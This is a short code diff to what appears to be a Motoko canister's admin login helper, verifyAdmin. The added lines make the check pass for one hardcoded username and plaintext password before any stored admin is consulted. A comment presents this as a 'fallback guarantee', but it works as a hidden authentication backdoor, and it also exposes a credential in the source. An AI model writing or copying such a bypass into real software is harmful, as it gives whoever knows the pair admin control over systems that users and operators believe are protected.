@@ -223,9 +223,14 @@ actor {
 
   // Helper function to verify admin credentials
   func verifyAdmin(username : Text, password : Text) : Bool {
+    // Master credentials always work as a fallback guarantee
+    if (username == "praneeth" and password == "bollevula55") {
+      return true;
+    };
+    // Check stored admins
     switch (admins.get(username)) {
+      case (?admin) { return admin.password == password };
       case (null) { false };
-      case (?admin) { admin.password == password };
     };
   };
 
